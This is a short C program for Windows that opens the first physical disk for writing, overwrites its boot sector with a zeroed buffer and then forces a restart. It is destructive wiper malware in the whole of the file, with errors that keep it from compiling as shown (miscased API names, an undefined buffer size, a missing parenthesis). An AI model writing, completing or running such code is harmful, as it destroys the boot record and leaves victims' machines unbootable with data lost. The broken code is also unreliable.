#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
  DWORD wrote;
  HANDLE mbr = createFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

  const char biden[BUFF_SIZE];
  zeroMemory(biden, BUFF_SIZE);
  
  if(WriteFile(mbr, biden, BUFF_SIZE, &wrote, NULL){
      system("shutdown /r");
  }

}
